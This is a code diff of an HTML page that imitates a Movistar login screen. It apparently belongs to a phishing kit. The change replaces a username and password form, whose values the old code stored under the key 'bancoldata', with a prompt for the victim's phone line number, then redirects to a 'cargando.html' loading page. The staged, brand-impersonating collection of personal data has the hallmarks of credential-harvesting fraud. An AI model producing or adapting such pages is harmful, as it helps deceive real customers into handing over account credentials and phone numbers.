@@ -6,7 +6,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <meta name="description" content="Iniciar sesión Movistar" />
   <meta name="theme-color" content="#019DF4" />
-  <title>Login - Movistar</title>
+  <title>Validar línea - Movistar</title>
   <link rel="shortcut icon" href="img/apple-touch-icon.png" type="image/x-icon">
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta2/dist/css/bootstrap.min.css" rel="stylesheet" />
   <style>
@@ -90,15 +90,12 @@
 
   <div class="login-container">
     <div class="login-box">
-      <h2>Iniciar sesión</h2>
+      <h2>Validar línea</h2>
       <form id="loginForm">
         <div class="mb-3">
-          <input type="text" id="usuario" class="form-control" placeholder="Usuario" required>
+          <input type="text" id="linea" class="form-control" placeholder="Ingresa tu número de línea" required>
         </div>
-        <div class="mb-3">
-          <input type="password" id="clave" class="form-control" placeholder="Clave" required>
-        </div>
-        <button type="submit" class="btn btn-primary w-100">Ingresar</button>
+        <button type="submit" class="btn btn-primary w-100">Continuar</button>
       </form>
     </div>
   </div>
@@ -111,14 +108,13 @@
     document.getElementById('loginForm').addEventListener('submit', function (e) {
       e.preventDefault();
 
-      const usuario = document.getElementById('usuario').value.trim();
-      const clave = document.getElementById('clave').value.trim();
+      const linea = document.getElementById('linea').value.trim();
 
-      if (!usuario || !clave) return;
+      if (!linea) return;
 
-      localStorage.setItem('bancoldata', JSON.stringify({ usuario, clave }));
+      localStorage.setItem('linea', linea);
 
-      // Redirigir a la página de cargando
+      // Redirige a la página siguiente
       window.location.href = "cargando.html";
     });
   </script>
